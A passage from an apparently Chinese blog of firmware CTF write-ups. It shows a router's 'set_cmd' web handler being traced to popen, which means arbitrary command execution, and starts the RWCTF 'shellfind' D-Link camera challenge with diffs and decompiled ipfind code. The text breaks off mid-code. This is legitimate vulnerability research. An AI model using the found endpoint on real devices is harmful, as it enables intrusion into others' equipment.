alt="img"></a></p><p>那么接下来就是根据以上这些信息前往固件包中查找信息了</p><p>使用binwak对文件进行解包,找到了上面的两个文件</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">find ./ -<span class="built_in">type</span> f  -name <span class="string">&quot;login.asp&quot;</span></span><br><span class="line">./etc_ro/web/login.asp</span><br><span class="line"></span><br><span class="line">find ./ -<span class="built_in">type</span> f  -name <span class="string">&quot;getinfo.js&quot;</span></span><br><span class="line">./etc_ro/web/admin/js/getinfo.js</span><br></pre></td></tr></table></figure><p>同时也能够找到版本信息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">WR-432-300M-28N-S-ZH,2.4.7</span><br></pre></td></tr></table></figure><p>不过去官网看了一下,官网不提供过往版本的固件,要不然其实也可以通过下载相近版本固件进行比较</p><p>再进行字符串查找,就查找之前那些url</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">grep -r <span class="string">&quot;set_qos_cfg&quot;</span></span><br><span class="line">匹配到二进制文件 bin/goahead</span><br><span class="line">etc_ro/web/admin/js/getinfo.js:url: <span class="string">&#x27;/goform/set_qos_cfg&#x27;</span>,</span><br><span class="line">etc_ro/web/admin/js/getinfo.js:url: <span class="string">&#x27;/goform/set_qos_cfg&#x27;</span>,</span><br><span class="line">etc_ro/web/admin/js/getinfo.js:url: <span class="string">&#x27;/goform/set_qos_cfg&#x27;</span>,</span><br></pre></td></tr></table></figure><p>找到了二进制文件goahead</p><p>之后直接浏览器搜索就能知道这是一个嵌入式web服务器</p><p>ida打开进行分析,搜索刚刚的字符串</p><p>找到如下引用</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">sub_453E58</span><span class="params">(<span class="type">int</span> a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> String; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">int</span> Object; <span class="comment">// $s0</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">int</span> v9; <span class="comment">// [sp+14h] [-1BCh]</span></span><br><span class="line">  <span class="type">int</span> v10; <span class="comment">// [sp+1Ch] [-1B4h]</span></span><br><span class="line">  <span class="type">int</span> v11; <span class="comment">// [sp+20h] [-1B0h]</span></span><br><span class="line">  <span class="type">char</span> v12[<span class="number">400</span>]; <span class="comment">// [sp+30h] [-1A0h] BYREF</span></span><br><span class="line">  <span class="type">int</span> Var; <span class="comment">// [sp+1C0h] [-10h]</span></span><br><span class="line">  <span class="type">int</span> v14; <span class="comment">// [sp+1C4h] [-Ch]</span></span><br><span class="line">  <span class="type">char</span> *v15; <span class="comment">// [sp+1C8h] [-8h]</span></span><br><span class="line"></span><br><span class="line">  v15 = <span class="string">&quot;get_remotemanage_info&quot;</span>;</span><br><span class="line">  Var = websGetVar(a1, &amp;off_46B66C, <span class="string">&quot;&quot;</span>);</span><br><span class="line">  v14 = websGetVar(a1, <span class="string">&quot;IP&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">  v10 = websGetVar(a1, <span class="string">&quot;Up_Speed&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">  v11 = websGetVar(a1, <span class="string">&quot;Dl_Speed&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">  bl_print(<span class="number">3</span>, <span class="string">&quot;CGI_json.c&quot;</span>, <span class="string">&quot;set_qos_cfg&quot;</span>, <span class="number">2391</span>);</span><br><span class="line">  Object = cJSON_CreateObject();</span><br><span class="line">  String = cJSON_CreateString(<span class="string">&quot;setqos&quot;</span>);</span><br><span class="line">  cJSON_AddItemToObject(Object, <span class="string">&quot;type&quot;</span>, String);</span><br><span class="line">  v4 = cJSON_CreateString(Var);</span><br><span class="line">  cJSON_AddItemToObject(Object, <span class="number">4634220</span>, v4);</span><br><span class="line">  v5 = cJSON_CreateString(v14);</span><br><span class="line">  cJSON_AddItemToObject(Object, <span class="string">&quot;IP&quot;</span>, v5);</span><br><span class="line">  v6 = cJSON_CreateString(v10);</span><br><span class="line">  cJSON_AddItemToObject(Object, <span class="string">&quot;Up_Speed&quot;</span>, v6);</span><br><span class="line">  v7 = cJSON_CreateString(v11);</span><br><span class="line">  cJSON_AddItemToObject(Object, <span class="string">&quot;Dl_Speed&quot;</span>, v7);</span><br><span class="line">  v9 = cJSON_PrintUnformatted(Object);</span><br><span class="line">  bl_print(<span class="number">3</span>, <span class="string">&quot;CGI_json.c&quot;</span>, <span class="string">&quot;set_qos_cfg&quot;</span>, <span class="number">2400</span>);</span><br><span class="line">  bs_SetQosInfo(v9, v12);</span><br><span class="line">  websResponse(a1, <span class="number">200</span>, v12, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">free</span>(v9);</span><br><span class="line">  <span class="keyword">return</span> cJSON_Delete(Object);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>再然后继续向上找引用,会找到一个定义大多数方法的函数</p><p>然后发现这里的方法引用比之前观察到的更多</p><p>找到一个看起来就有古怪的函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"> websFormDefine(<span class="string">&quot;set_cmd&quot;</span>, sub_44D41C);</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> __fastcall <span class="title function_">sub_44D41C</span><span class="params">(<span class="type">int</span> a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> Var; <span class="comment">// $s5</span></span><br><span class="line">  <span class="type">int</span> String; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">int</span> Object; <span class="comment">// $s0</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// $s2</span></span><br><span class="line">  <span class="type">char</span> v8[<span class="number">8200</span>]; <span class="comment">// [sp+20h] [-2008h] BYREF</span></span><br><span class="line"></span><br><span class="line">  Var = websGetVar(a1, <span class="string">&quot;cmd&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">  bl_print(<span class="number">3</span>, <span class="string">&quot;CGI_json.c&quot;</span>, <span class="string">&quot;set_cmd&quot;</span>, <span class="number">3968</span>);</span><br><span class="line">  Object = cJSON_CreateObject();</span><br><span class="line">  String = cJSON_CreateString(<span class="string">&quot;setcmd&quot;</span>);</span><br><span class="line">  cJSON_AddItemToObject(Object, <span class="string">&quot;type&quot;</span>, String);</span><br><span class="line">  v5 = cJSON_CreateString(Var);</span><br><span class="line">  cJSON_AddItemToObject(Object, <span class="string">&quot;cmd&quot;</span>, v5);</span><br><span class="line">  v6 = cJSON_PrintUnformatted(Object);</span><br><span class="line">  <span class="built_in">memset</span>(v8, <span class="number">0</span>, <span class="number">8196</span>);</span><br><span class="line">  bs_SetCmd(v6, v8);</span><br><span class="line">  bl_print(<span class="number">3</span>, <span class="string">&quot;CGI_json.c&quot;</span>, <span class="string">&quot;set_cmd&quot;</span>, <span class="number">3976</span>);</span><br><span class="line">  websResponse(a1, <span class="number">200</span>, v8, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">free</span>(v6);</span><br><span class="line">  <span class="keyword">return</span> cJSON_Delete(Object);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>看到这个函数bs_SetCmd(v6, v8);</p><p>找到其被定义在<code>libshare-0.0.26.so</code></p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">grep -r <span class="string">&quot;bs_SetCmd&quot;</span></span><br><span class="line">匹配到二进制文件 bin/goahead</span><br><span class="line">匹配到二进制文件 lib/libshare-0.0.26.so</span><br></pre></td></tr></table></figure><p>看其定义</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"> .....</span><br><span class="line">&#125;</span><br><span class="line">  v11 = cJSON_GetObjectItem(v4, <span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v11 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">memset</span>(v21, <span class="number">0</span>, <span class="keyword">sizeof</span>(v21));</span><br><span class="line">    <span class="built_in">strcpy</span>(v21, *(_DWORD *)(v11 + <span class="number">16</span>));</span><br><span class="line">    <span class="built_in">sprintf</span>(v23, &amp;off_4F2CC, v21);</span><br><span class="line">    v14 = popen(v23, <span class="string">&quot;r&quot;</span>);</span><br><span class="line"> ....</span><br></pre></td></tr></table></figure><p>发现其会直接获取cmd的键并直接执行,尝试访问</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/2024-05-13_192745.png" alt=""></p><h1 id="RWCTF5th-shellfind"><a href="#RWCTF5th-shellfind" class="headerlink" title="RWCTF5th-shellfind"></a>RWCTF5th-shellfind</h1><p>拿到手的是一个常见的bin固件包,相比于常规pwn题单一的二进制而言，我们首先要做的是寻找漏洞文件</p><p>这里有三种情况</p><ol><li>这个固件存在0day漏洞,但一般不会这么干.0.</li><li>固件存在已公布的cve</li><li>出题人自己修改导致漏洞</li></ol><p>这题应该是第三种情况,然后漏洞也搜索了一下,找到了一个<a href="https://www.opencve.io/cve/CVE-2019-17146"><strong>CVE-2019-17146</strong></a>但在这个固件包中是已经修复的了</p><p>最新的固件下载链接：<a href="https://www.dlinktw.com.tw/techsupport/ProductInfo.aspx?m=DCS-960L">https://www.dlinktw.com.tw/techsupport/ProductInfo.aspx?m=DCS-960L</a></p><p>下载之后直接diff比较一下</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">diff -r shellfind/ offcial/</span><br><span class="line">diff: shellfind/etc/hosts: 没有那个文件或目录</span><br><span class="line">diff: offcial/etc/hosts: 没有那个文件或目录</span><br><span class="line">diff: shellfind/etc/passwd: 没有那个文件或目录</span><br><span class="line">diff: offcial/etc/passwd: 没有那个文件或目录</span><br><span class="line">diff: shellfind/etc/ppp: 没有那个文件或目录</span><br><span class="line">diff: offcial/etc/ppp: 没有那个文件或目录</span><br><span class="line">diff: shellfind/etc/resolv.conf: 没有那个文件或目录</span><br><span class="line">diff: offcial/etc/resolv.conf: 没有那个文件或目录</span><br><span class="line">diff: shellfind/etc/simplecfg: 没有那个文件或目录</span><br><span class="line">diff: offcial/etc/simplecfg: 没有那个文件或目录</span><br><span class="line">diff: shellfind/etc/stunnel/stunnel.conf: 没有那个文件或目录</span><br><span class="line">diff: offcial/etc/stunnel/stunnel.conf: 没有那个文件或目录</span><br><span class="line">diff: shellfind/etc/stunnel/stunnel-smtps.conf: 没有那个文件或目录</span><br><span class="line">diff: offcial/etc/stunnel/stunnel-smtps.conf: 没有那个文件或目录</span><br><span class="line">diff: shellfind/etc/stunnel/stunnel-smtps-test.conf: 没有那个文件或目录</span><br><span class="line">diff: offcial/etc/stunnel/stunnel-smtps-test.conf: 没有那个文件或目录</span><br><span class="line">diff: shellfind/etc/TZ: 没有那个文件或目录</span><br><span class="line">diff: offcial/etc/TZ: 没有那个文件或目录</span><br><span class="line">diff: shellfind/etc/Wireless/RTL8192CD.dat: 没有那个文件或目录</span><br><span class="line">diff: offcial/etc/Wireless/RTL8192CD.dat: 没有那个文件或目录</span><br><span class="line">diff: shellfind/tmp: 没有那个文件或目录</span><br><span class="line">diff: offcial/tmp: 没有那个文件或目录</span><br><span class="line">二进制文件 shellfind/usr/sbin/ipfind 和 offcial/usr/sbin/ipfind 不同</span><br><span class="line">diff: shellfind/web/cgi-bin/cgi/admin/ptcmd.cgi: 没有那个文件或目录</span><br><span class="line">diff: offcial/web/cgi-bin/cgi/admin/ptcmd.cgi: 没有那个文件或目录</span><br><span class="line">diff: shellfind/web/cgi-bin/cgi/admin/ptctl.cgi: 没有那个文件或目录</span><br><span class="line">diff: offcial/web/cgi-bin/cgi/admin/ptctl.cgi: 没有那个文件或目录</span><br></pre></td></tr></table></figure><p>可以看到出题人应该是修改了ipfind二进制文件</p><p>然后bindiff分析一下,发现</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/2024-05-14_231738.png" alt=""></p><p>点进去看看,果然被出题人打过patch</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/2024-05-14_231837.png" alt=""></p><p>不过光看此处并不能看出什么东西来,深入分析一下二进制文件ipfind</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">bool</span> v4; <span class="comment">// dc</span></span><br><span class="line">  fd_set *v5; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// $a0</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// $s7</span></span><br><span class="line">  <span class="type">int</span> v8; <span class="comment">// $fp</span></span><br><span class="line">  <span class="type">int</span> v9; <span class="comment">// [sp+20h] [-8E8h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v10; <span class="comment">// [sp+24h] [-8E4h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v11; <span class="comment">// [sp+28h] [-8E0h] BYREF</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr</span> <span class="title">v12</span>;</span> <span class="comment">// [sp+2Ch] [-8DCh] BYREF</span></span><br><span class="line">  <span class="type">char</span> v13[<span class="number">32</span>]; <span class="comment">// [sp+3Ch] [-8CCh] BYREF</span></span><br><span class="line">  fd_set v14; <span class="comment">// [sp+5Ch] [-8ACh] BYREF</span></span><br><span class="line">  _DWORD v15[<span class="number">512</span>]; <span class="comment">// [sp+DCh] [-82Ch] BYREF</span></span><br><span class="line">  <span class="type">char</span> v16; <span class="comment">// [sp+8DCh] [-2Ch] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v17; <span class="comment">// [sp+8E8h] [-20h]</span></span><br><span class="line">  <span class="type">char</span> *v18; <span class="comment">// [sp+8ECh] [-1Ch]</span></span><br><span class="line">  <span class="type">socklen_t</span> *addr_len; <span class="comment">// [sp+8F0h] [-18h]</span></span><br><span class="line">  <span class="type">char</span> *v20; <span class="comment">// [sp+8F4h] [-14h]</span></span><br><span class="line">  <span class="type">void</span> *v21; <span class="comment">// [sp+8F8h] [-10h]</span></span><br><span class="line">  <span class="type">void</span> *v22; <span class="comment">// [sp+8FCh] [-Ch]</span></span><br><span class="line">  <span class="type">void</span> *v23; <span class="comment">// [sp+900h] [-8h]</span></span><br><span class="line"></span><br><span class="line">  v9 = <span class="number">1</span>;</span><br><span class="line">  v10 = <span class="number">1</span>;</span><br><span class="line">  v11 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( argc &gt;= <span class="number">2</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    ifname = (<span class="type">int</span>)argv[<span class="number">1</span>];</span><br><span class="line">    v4 = sub_401120() &lt; <span class="number">0</span>;</span><br><span class="line">    result = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> ( !v4 )</span><br><span class="line">    &#123;</span><br><span class="line">      sub_401240();</span><br><span class="line">      server_sockfd = socket(<span class="number">2</span>, <span class="number">1</span>, <span class="number">17</span>);</span><br><span class="line">      <span class="keyword">if</span> ( server_sockfd == <span class="number">-1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        sub_4013D0(<span class="string">&quot;Can&#x27;t get server socket\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        v12.sa_family = <span class="number">2</span>;</span><br><span class="line">        <span class="built_in">memset</span>(&amp;v12.sa_data[<span class="number">2</span>], <span class="number">0</span>, <span class="number">12</span>);</span><br><span class="line">        *(_WORD *)v12.sa_data = <span class="number">-2816</span>;</span><br><span class="line">        <span class="built_in">strncpy</span>(v13, (<span class="type">const</span> <span class="type">char</span> *)ifname, <span class="number">0x10</span>u);</span><br><span class="line">        <span class="keyword">if</span> ( setsockopt(server_sockfd, <span class="number">0xFFFF</span>, <span class="number">25</span>, v13, <span class="number">0x20</span>u) &gt;= <span class="number">0</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( setsockopt(server_sockfd, <span class="number">0xFFFF</span>, <span class="number">32</span>, &amp;v9, <span class="number">4u</span>) &gt;= <span class="number">0</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="keyword">if</span> ( setsockopt(server_sockfd, <span class="number">0xFFFF</span>, <span class="number">4</span>, &amp;v10, <span class="number">4u</span>) &gt;= <span class="number">0</span> )</span><br><span class="line">            &#123;</span><br><span class="line">              <span class="keyword">if</span> ( bind(server_sockfd, &amp;v12, <span class="number">0x10</span>u) &gt;= <span class="number">0</span> )</span><br><span class="line">              &#123;</span><br><span class="line">                sub_4013D0(<span class="string">&quot;IPFind start(%s)...\n&quot;</span>, (<span class="type">const</span> <span class="type">char</span> *)ifname);</span><br><span class="line">                v18 = (<span class="type">char</span> *)v15;</span><br><span class="line">                v21 = (<span class="type">char</span> *)&amp;v15[<span class="number">4</span>] + <span class="number">1</span>;</span><br><span class="line">                addr_len = (<span class="type">socklen_t</span> *)&amp;v11;</span><br><span class="line">                v20 = <span class="string">&quot;FIVI&quot;</span>;</span><br><span class="line">                v22 = &amp;v16;</span><br><span class="line">                v23 = &amp;unk_402E90;</span><br><span class="line">                <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">                &#123;</span><br><span class="line">                  v5 = &amp;v14;</span><br><span class="line">                  <span class="keyword">if</span> ( dword_413168 )</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                  <span class="keyword">do</span></span><br><span class="line">                  &#123;</span><br><span class="line">                    v5-&gt;__fds_bits[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">                    v5 = (fd_set *)((<span class="type">char</span> *)v5 + <span class="number">4</span>);</span><br><span class="line">                  &#125;</span><br><span class="line">                  <span class="keyword">while</span> ( v5 != (fd_set *)v15 );</span><br><span class="line">                  v6 = server_sockfd;</span><br><span class="line">                  v14.__fds_bits[(<span class="type">unsigned</span> <span class="type">int</span>)server_sockfd &gt;&gt; <span class="number">5</span>] |= <span class="number">1</span> &lt;&lt; server_sockfd;</span><br><span class="line">                  <span class="keyword">if</span> ( select(v6 + <span class="number">1</span>, &amp;v14, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>) &gt;= <span class="number">0</span> )</span><br><span class="line">                  &#123;</span><br><span class="line">                    <span class="keyword">if</span> ( ((v14.__fds_bits[(<span class="type">unsigned</span> <span class="type">int</span>)server_sockfd &gt;&gt; <span class="number">5</span>] &gt;&gt; server_sockfd) &amp; <span class="number">1</span>) != <span class="number">0</span> )</span><br><span class="line">                    &#123;</span><br><span class="line">                      v11 = <span class="number">16</span>;</span><br><span class="line">                      <span class="built_in">memset</span>(v15, <span class="number">0</span>, <span class="keyword">sizeof</span>(v15));</span><br><span class="line">                      recvfrom(server_sockfd, v15, <span class="number">0x800</span>u, <span class="number">0</span>, (<span class="keyword">struct</span> sockaddr *)&amp;client_addr, addr_len);</span><br><span class="line">                      v15[<span class="number">1</span>] = (v15[<span class="number">1</span>] &lt;&lt; <span class="number">24</span>) | HIBYTE(v15[<span class="number">1</span>]) | ((v15[<span class="number">1</span>] &amp; <span class="number">0xFF0000</span>u) &gt;&gt; <span class="number">8</span>) | ((v15[<span class="number">1</span>] &amp; <span class="number">0xFF00</span>) &lt;&lt; <span class="number">8</span>);</span><br><span class="line">                      v7 = (<span class="type">unsigned</span> __int16)((_byteswap_ushort(*(<span class="type">unsigned</span> __int16 *)((<span class="type">char</span> *)&amp;v15[<span class="number">2</span>] + <span class="number">1</span>)) &lt;&lt; <span class="number">8</span>) | ((<span class="type">unsigned</span> <span class="type">int</span>)(BYTE2(v15[<span class="number">2</span>]) | (BYTE1(v15[<span class="number">2</span>]) &lt;&lt; <span class="number">8</span>)) &gt;&gt; <span class="number">8</span>));</span><br><span class="line">                      *(_WORD *)((<span class="type">char</span> *)&amp;v15[<span class="number">2</span>] + <span class="number">1</span>) = v7;</span><br><span class="line">                      *(_WORD *)((<span class="type">char</span> *)&amp;v15[<span class="number">2</span>] + <span class="number">3</span>) = (_byteswap_ushort(*(<span class="type">unsigned</span> __int16 *)((<span class="type">char</span> *)&amp;v15[<span class="number">2</span>] + <span class="number">3</span>)) &lt;&lt; <span class="number">8</span>) | ((<span class="type">unsigned</span> <span class="type">int</span>)(HIBYTE(v15[<span class="number">3</span>]) | (LOBYTE(v15[<span class="number">2</span>]) &lt;&lt; <span class="number">8</span>)) &gt;&gt; <span class="number">8</span>);</span><br><span class="line">                      v8 = (<span class="type">unsigned</span> __int16)((_byteswap_ushort(*(<span class="type">unsigned</span> __int16 *)((<span class="type">char</span> *)&amp;v15[<span class="number">5</span>] + <span class="number">3</span>)) &lt;&lt; <span class="number">8</span>) | ((<span class="type">unsigned</span> <span class="type">int</span>)(HIBYTE(v15[<span class="number">6</span>]) | (LOBYTE(v15[<span class="number">5</span>]) &lt;&lt; <span class="number">8</span>)) &gt;&gt; <span class="number">8</span>));</span><br><span class="line">                      *(_WORD *)((<span class="type">char</span> *)&amp;v15[<span class="number">5</span>] + <span class="number">3</span>) = v8;</span><br><span class="line">                      v17 = (*(_DWORD *)((<span class="type">char</span> *)&amp;v15[<span class="number">6</span>] + <span class="number">1</span>) &lt;&lt; <span class="number">24</span>) | HIBYTE(*(_DWORD *)((<span class="type">char</span> *)&amp;v15[<span class="number">6</span>] + <span class="number">1</span>)) | ((*(_DWORD *)((<span class="type">char</span> *)&amp;v15[<span class="number">6</span>] + <span class="number">1</span>) &amp; <span class="number">0xFF0000</span>u) &gt;&gt; <span class="number">8</span>) | ((*(_DWORD *)((<span class="type">char</span> *)&amp;v15[<span class="number">6</span>] + <span class="number">1</span>) &amp; <span class="number">0xFF00</span>) &lt;&lt; <span class="number">8</span>);</span><br><span class="line">                      *(_DWORD *)((<span class="type">char</span> *)&amp;v15[<span class="number">6</span>] + <span class="number">1</span>) = v17;</span><br><span class="line">                      <span class="keyword">if</span> ( !<span class="built_in">strncmp</span>(v18, v20, <span class="number">4u</span>) &amp;&amp; HIBYTE(v15[<span class="number">2</span>]) == <span class="number">10</span> )</span><br><span class="line">                      &#123;</span><br><span class="line">                        <span class="keyword">if</span> ( v7 == <span class="number">1</span> )</span><br><span class="line">                        &#123;</span><br><span class="line">                          <span class="keyword">if</span> ( !v8 &amp;&amp; !<span class="built_in">memcmp</span>(v21, v23, <span class="number">6u</span>) &amp;&amp; !v17 )</span><br><span class="line">                            sub_40172C(v15);</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">else</span> <span class="keyword">if</span> ( v7 == <span class="number">2</span></span><br><span class="line">                               &amp;&amp; net_get_hwaddr(ifname, v22) &gt;= <span class="number">0</span></span><br><span class="line">                               &amp;&amp; !<span class="built_in">memcmp</span>(v21, v22, <span class="number">6u</span>)</span><br><span class="line">                               &amp;&amp; *(_DWORD *)((<span class="type">char</span> *)&amp;v15[<span class="number">6</span>] + <span class="number">1</span>) == <span class="number">142</span> )</span><br><span class="line">                        &#123;</span><br><span class="line">                          sub_4013F4(v15, <span class="number">142</span>);</span><br><span class="line">                        &#125;</span><br><span class="line">                      &#125;</span><br><span class="line">                    